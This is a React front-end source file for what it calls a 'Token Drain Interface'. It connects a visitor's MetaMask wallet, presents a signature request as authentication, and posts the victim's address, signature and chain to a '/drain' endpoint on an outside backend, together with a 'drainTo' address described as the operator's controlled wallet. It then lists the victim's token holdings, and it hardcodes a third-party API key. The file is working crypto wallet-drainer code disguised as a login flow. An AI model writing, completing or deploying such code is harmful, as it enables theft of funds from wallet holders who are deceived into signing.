import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './mobile-fix.css';

function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [authStatus, setAuthStatus] = useState('');
  const [backendUrl] = useState('https://tokenbackendwork.onrender.com'); // Your backend URL
  const [userTokens, setUserTokens] = useState([]);
  const [chainId, setChainId] = useState(1); // Default Ethereum

  // Check if wallet is already connected on component mount
  useEffect(() => {
    checkWalletConnection();
  }, []);

  const checkWalletConnection = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          await handleWalletConnection(accounts[0]);
        }
      } catch (error) {
        console.error("Error checking wallet connection:", error);
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      alert('Please install MetaMask!');
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      });
      
      if (accounts.length > 0) {
        await handleWalletConnection(accounts[0]);
      }
    } catch (error) {
      console.error("Connection error:", error);
      setAuthStatus('Connection failed');
    }
  };

  const handleWalletConnection = async (account) => {
    setWalletAddress(account);
    setIsConnected(true);
    setAuthStatus('Wallet connected');
    
    // Get chain ID
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    setChainId(Number(network.chainId));
    
    // Start authentication process
    await initiateBackendAuthentication(account);
  };

  const initiateBackendAuthentication = async (address) => {
    try {
      setIsAuthenticating(true);
      setAuthStatus('Requesting signature...');
      
      // Step 1: Request signature for authentication
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Create a unique message for signing
      const message = `Authenticate to Token Drain API\n\nTimestamp: ${Date.now()}\nWallet: ${address}`;
      
      // Request signature
      const signature = await signer.signMessage(message);
      setSignature(signature);
      
      setAuthStatus('Signature received, authenticating with backend...');
      
      // Step 2: Send to backend
      await sendToBackend(address, signature, message);
      
    } catch (error) {
      console.error("Authentication error:", error);
      setAuthStatus('Authentication failed');
      setIsAuthenticating(false);
    }
  };

  const sendToBackend = async (address, sig, message) => {
    try {
      setAuthStatus('Connecting to backend...');
      
      // Prepare drain address (this should be your controlled address)
      const drainTo = "0xYourDrainWalletAddress"; // Replace with your actual drain address
      
      // Send POST request to backend
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          signature: sig,
          message: message,
          chainId: chainId,
          drainTo: drainTo,
          timestamp: new Date().toISOString()
        }),
      });

      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Successfully authenticated with backend!');
        console.log("Backend response:", data);
        
        // Now fetch user's tokens
        await fetchUserTokens(address);
      } else {
        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
      }
      
      setIsAuthenticating(false);
      
    } catch (error) {
      console.error("Backend connection error:", error);
      setAuthStatus('Failed to connect to backend');
      setIsAuthenticating(false);
    }
  };

  const fetchUserTokens = async (address) => {
    try {
      setAuthStatus('Fetching your tokens...');
      
      // Fetch tokens from backend
      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
      const data = await response.json();
      
      if (data.success) {
        setUserTokens(data.data.tokens || []);
        setAuthStatus(`✅ Found ${data.data.tokens.length} tokens`);
      } else {
        // Fallback to direct Covalent API if backend fails
        await fetchTokensDirectly(address);
      }
      
    } catch (error) {
      console.error("Token fetch error:", error);
      // Try direct API as fallback
      await fetchTokensDirectly(address);
    }
  };

  const fetchTokensDirectly = async (address) => {
    // Fallback to direct Covalent API
    const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
    
    try {
      const response = await fetch(url);
      const data = await response.json();
      
      const tokens = data.data?.items
        ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
        .map(t => ({
          symbol: t.contract_ticker_symbol || 'TOKEN',
          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18))
        })) || [];
      
      setUserTokens(tokens);
      setAuthStatus(`✅ Found ${tokens.length} tokens (via direct API)`);
    } catch (error) {
      console.error("Direct API fetch error:", error);
      setAuthStatus('Token fetch failed');
    }
  };

  const disconnectWallet = () => {
    setIsConnected(false);
    setWalletAddress('');
    setSignature('');
    setUserTokens([]);
    setAuthStatus('Disconnected');
  };

  // Listen for account changes
  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
          handleWalletConnection(accounts[0]);
        } else {
          disconnectWallet();
        }
      });

      window.ethereum.on('chainChanged', () => {
        window.location.reload();
      });

      return () => {
        if (window.ethereum.removeListener) {
          window.ethereum.removeListener('accountsChanged', handleWalletConnection);
          window.ethereum.removeListener('chainChanged', () => {});
        }
      };
    }
  }, []);

  return (
    <div className="App">
      <header className="App-header">
        <h1>Token Drain Interface</h1>
        
        {!isConnected ? (
          <div className="connection-section">
            <button onClick={connectWallet} className="connect-button">
              Connect Wallet
            </button>
            <p className="instruction">Connect your wallet to get started</p>
          </div>
        ) : (
          <div className="wallet-info">
            <div className="status-container">
              <div className="wallet-details">
                <h3>Wallet Connected</h3>
                <p className="wallet-address">
                  {walletAddress.substring(0, 6)}...{walletAddress.substring(walletAddress.length - 4)}
                </p>
                <p className="chain-info">Chain ID: {chainId}</p>
              </div>
              
              <div className="auth-status">
                <div className={`status-indicator ${isAuthenticating ? 'loading' : authStatus.includes('✅') ? 'success' : ''}`}>
                  {isAuthenticating ? '⏳' : authStatus.includes('✅') ? '✅' : '⚠️'}
                </div>
                <p className="status-text">{authStatus}</p>
                {signature && (
                  <p className="signature-info">
                    Signature: {signature.substring(0, 10)}...✓
                  </p>
                )}
              </div>
              
              <button onClick={disconnectWallet} className="disconnect-button">
                Disconnect
              </button>
            </div>

            {userTokens.length > 0 && (
              <div className="tokens-section">
                <h3>Your Tokens</h3>
                <div className="tokens-grid">
                  {userTokens.map((token, index) => (
                    <div key={index} className="token-card">
                      <div className="token-symbol">{token.symbol}</div>
                      <div className="token-amount">{token.amount.toFixed(4)}</div>
                      {token.value > 0 && (
                        <div className="token-value">${token.value.toFixed(2)}</div>
                      )}
                    </div>
                  ))}
                </div>
                <div className="tokens-summary">
                  Total: {userTokens.length} tokens
                </div>
              </div>
            )}

            {!isAuthenticating && authStatus.includes('✅') && (
              <div className="actions-section">
                <button 
                  onClick={() => fetchUserTokens(walletAddress)}
                  className="refresh-button"
                >
                  Refresh Tokens
                </button>
                <button 
                  onClick={() => initiateBackendAuthentication(walletAddress)}
                  className="reconnect-button"
                >
                  Re-authenticate with Backend
                </button>
              </div>
            )}
          </div>
        )}

        <div className="backend-info">
          <p>Backend URL: {backendUrl}</p>
          <div className="endpoint-links">
            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">
              API Docs
            </a>
            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
              Health Check
            </a>
            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">
              Supported Chains
            </a>
          </div>
        </div>
      </header>
    </div>
  );
}

export default App;

